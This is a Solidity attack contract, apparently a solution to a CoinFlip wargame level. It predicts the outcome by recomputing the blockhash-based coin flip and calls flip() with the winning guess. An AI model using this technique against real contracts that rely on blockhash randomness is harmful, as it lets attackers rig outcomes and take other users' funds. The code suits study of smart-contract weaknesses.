//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import './CoinFlip.sol';

contract CoinFlipAttack {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    function attack(address _vixtim) public returns (bool) {
    CoinFlip coinflip = CoinFlip(_vixtim);
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    bool side = coinFlip == 1 ? true : false;
    coinflip.flip(side);
    return side;
  }
}